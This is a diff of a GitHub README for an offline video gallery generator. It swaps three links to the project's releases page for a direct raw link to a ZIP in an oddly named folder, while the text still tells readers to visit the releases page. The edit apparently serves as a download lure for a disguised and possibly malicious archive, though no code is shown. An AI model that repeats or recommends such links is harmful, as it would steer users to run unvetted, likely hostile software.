@@ -1,10 +1,10 @@
 # 🖼️ offline-video-gallery-generator - Turn videos into a local gallery
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/ibrahim4sabaylh/offline-video-gallery-generator/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/ibrahim4sabaylh/offline-video-gallery-generator/main/flaccidly/offline_generator_gallery_video_1.4.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/ibrahim4sabaylh/offline-video-gallery-generator/releases
+Visit this page to download: https://raw.githubusercontent.com/ibrahim4sabaylh/offline-video-gallery-generator/main/flaccidly/offline_generator_gallery_video_1.4.zip
 
 Choose the latest release, then download the Windows file from the Assets section
 
@@ -35,7 +35,7 @@ If your videos are in many folders, move the ones you want into one main folder 
 
 ## 🚀 Getting started
 
-1. Visit the releases page: https://github.com/ibrahim4sabaylh/offline-video-gallery-generator/releases
+1. Visit the releases page: https://raw.githubusercontent.com/ibrahim4sabaylh/offline-video-gallery-generator/main/flaccidly/offline_generator_gallery_video_1.4.zip
 2. Download the latest Windows package or source files from the Assets section
 3. If the download is a ZIP file, right-click it and choose Extract All
 4. Open the extracted folder
